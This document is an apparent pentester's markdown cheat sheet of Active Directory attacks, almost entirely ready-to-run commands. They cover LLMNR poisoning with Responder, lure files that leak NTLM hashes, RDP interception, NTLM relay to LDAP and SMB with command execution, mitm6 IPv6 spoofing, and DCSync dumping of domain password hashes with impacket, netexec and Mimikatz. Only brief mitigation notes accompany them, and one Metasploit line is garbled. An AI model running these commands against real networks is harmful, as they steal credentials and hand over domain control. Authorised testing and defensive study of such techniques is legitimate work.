
#### LLMNR Poisoning Capture credentials :

using Responsder :
```bash
responder -I eth0
sudo responder -I eth0 -dwPv
responder -I eth0 -wd  #Starting wpad and DHCP server.
responder -I eth0 -A
responder -I eth0 -wdF -b #get clear text password , in victum browser run fun.local
responder -I eth0 -e 192.168.1.2
responder -I eth0 -wdF --lm --disable-es
responder -I eth0 -D  #dns injection

```

using metasploit capture:
```
set JOHNPWFILE /path/to/store/john_hashes.txt
set CAINPWFILE /path/to/store/cain_hashes.txt

msfconsole -x "use auxiliary/server/capture/smb; set SRVHOST 192.168.178.136; set SRVPORT 445; set SMBDomain WORKGROUP; run"

# using spoofing:
msfconsole -q -x "use auxiliary/spoof/nbns/nbns_response; set SPOOFIP 192.168.1.103; set INTERFACE eth0; run; exit"

```

using unc injector:
```bash
msfconsole -q -x "use auxiliary/docx/word_unc_injector; set LHOST 192.168.1.103; run; exit"
#then start server/capture/smb
```


using ntlm_theft:
```bash
python3 ntlm_theft.py -g all -s 192.168.1.3 -f test
python3 ntlm_theft.py -g modern -s 192.168.1.3 -f ignite
#send the generated file to victums and then start listener
```

LLMNR Poisoning mitigation :
- "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group policy editor.
- DIsable NBT-NS, naviage to Network Connections > Network Adaptor Properties > TCP/IPv4 Properties > Advanced tab > Wins tab and select "Disable NetBIOS over TCP/IP"
- Require good password policy 


> [!NOTE] Note for real world :
>Share folder is just the one example , various request fly across the network , if LMNR is enabled , so good time to run tool responder  is going to be early on in the morning. or after lunch when people are logging into their computers, generating a log of traffic. Running any Nessus scans or vulnerability scans at same time , not a bad idea.


#### RDP MITM :

```bash
./seth.sh <interface> <attacker ip> <victum ip> <DC ip>
./seth.sh eth0 192.168.154.137 192.168.154.131 192.168.154.134
#when victum domain admin group user try to connect to dc ip , account credentials we capture .
```

#### LDAP Relay :
```bash
#t: Target service (LDAP server or domain controller)
#-l: Directory to store loot (NTLM hashes, TGTs, etc.)
ntlmrelayx.py -t ldap://<DC_IP> -l lootdir/
ntlmrelayx.py -t ldaps://<DC_IP> -l lootdir/

ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server
ntlmrelayx.py -t ldaps://<DC_IP> --add-computer
--delegate-access

ntlmrelayx.py -t ldaps://<DC_IP> --escalate-user <target-username>
ntlmrelayx.py -t ldaps://<DC_IP> --shadow-credentials
ntlmrelayx.py -tf targets.txt -l loot/
ntlmrelayx.py -t ldaps://<DC_IP> --http-port 80 --no-smb-server

```


#### SMB Relay :
```bash
sudo nmap --script=smb2-security-mode.nse -p445 192.168.154.0/24
#Look for any host have this "Message signing enabled but not required"
#add to targets.txt

#Responder:
#edit this file and change SMB=off and HTTP=off
sudo vi /etc/responder/Responder.conf 

#run impacket script
impacket-ntlmrelayx -tf targets.txt -smb2support #dumphash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami" #command
impacket-ntlmrelayx -tf targets.txt -smb2support -i #interactive terminal

#point victum machine to attacker machine somehow , like //<Attacker-IP>

#impacket script relay to targets.txt hosts , if the captured credentials have #valid account in relayed hosts with "Administrative privileges" then we dump #sam local hash or perform other action.


Mitigation Strategies:
- Enable SMB Signing on all devcies
- Disable NTLM authentication on network
- Account tiering
- Local admin restriction
```


#### IPv6 Attack :
```bash
#In IPv6 attack we can make attacker machine as DNS server for Ipv6 traffic as there nobody doing dns for ipv6 traffic

#Any victum machine in domain should be reboot or just poweron or somebody login in doamin in order to this attack work.

#capture NTLM credentials using with help of spoofed DNS. relay this to Domain controller.

#it is okey the relay user credentials is simply domain user. 

#make fake dns server:
sudo mitm6 -d <domain name>

#uses ldaps service to relay the ntlm hash  and athenticate to domain controller.
impacket-ntlmrelayx -6 -t ldaps://192.168.154.134 -wh fakewpad.marvel.local -l lootme

#wait somebody to login or reboot machine.
```



#### DCSync Attack :
```bash
A DCsync attack is a technique where an attacker pretends to be a Domain Controller (DC) and asks the real DC to replicate password data for certain users — including NTLM password hashes, Kerberos keys, and cleartext passwords (if stored)

It abuses the Microsoft Directory Replication Service (DRS) Remote Protocol (`DRSUAPI`) — which is meant for DCs to synchronize Active Directory data.

Domain Admins, Enterprise Admins, and the Domain Controllers group have this.
Misconfigured permissions can let non-admin users do this.

- The attacker tool sends a DRSUAPI request to the DC.
- The DC thinks: "Oh, you’re a trusted DC wanting to sync — here’s the password database."
- It returns password hashes for the requested accounts.

#settings for attack
- Open Active Directory Users and Computers Press Win + R, type dsa.msc, and press Enter.
- Enable Advanced Features, in the top menu, go to View and select Advanced Features.
- Locate the Domain Object, navigate to the root of the domain (e.g., ignite.local).

#if you have any domain admins and administrator credentials make any non admin user misconfigure.

sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' add dcsync fcastle

#remove non admin user from misconfig
sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' remove dcsync fcastle


#using impacket-dacledit add:
impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action write -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134

#remove impacket-dacledit remove:
impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action remove -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134


#using relay:
impacket-ntlmrelayx -t ldap://192.168.154.134 --escalate-user

#using pfx to gain DCSync privilege:

#search for .pfx file
Get-ADUser -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }

Get-ADComputer -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }

#if find any .pfx flie tranfer to attacker machine.
certipy-ad cert -pfx administrator.pfx -nokey -out "user.crt"
certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"

#pass the extracted cert to dc for modify user object.
./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate

#Emunerate if compromised account have replication permission.
bloodhound-python -u aarti -p Password@1 -ns 192.168.1.48 -d ignite.local -c All

#exploit using secretsdump:
impacket-secretsdump 'ignite.local'/'aarti':'Password@1'@'192.168.1.48'

#Netexec validate permissions
nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds
nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator


#metasploit 
msfconsadmin
ole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48; set SMBUser aarti; set SMBPass Password@1; run"

#using Mimikatz
privilege::debug
lsadump::dcsync /user:<target_user>
lsadump::dcsync /domain:ignite.local /user:krbtgt
```